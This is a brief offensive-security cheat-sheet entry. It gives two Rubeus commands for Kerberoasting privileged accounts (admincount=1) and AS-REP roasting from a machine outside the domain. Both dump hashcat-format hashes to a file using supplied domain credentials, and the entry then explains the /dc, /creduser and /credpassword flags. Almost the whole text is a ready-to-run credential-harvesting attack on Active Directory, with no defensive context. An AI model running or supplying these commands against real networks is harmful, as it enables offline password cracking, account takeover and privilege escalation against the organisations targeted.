```
kerberoast remote from non-domain machine with domain user creds:
1. Rubeus.exe kerberoast /dc:wesads15.wes.local /ldapfilter:'admincount=1' /format:hashcat /outfile:C:\ProgramData\hashes.txt /creduser:domain.local\username /credpassword:UserPass!

Asreproast remote from non-domain machine with domain user creds:
2. Rubeus.exe asreproast /format:hashcat /outfile:C:\ProgramData\asrephashes.txt /dc:dc.domain.local /creduser:domain.local\username /credpassword:UserPass!
```
As you can see we are doing the same as in the usual attack, we just add 3 new attributes:
/dc: - specify the domain controller
/creduser: - username of the domain user we are launching from
/credpassword: - password of the domain user we are launching from
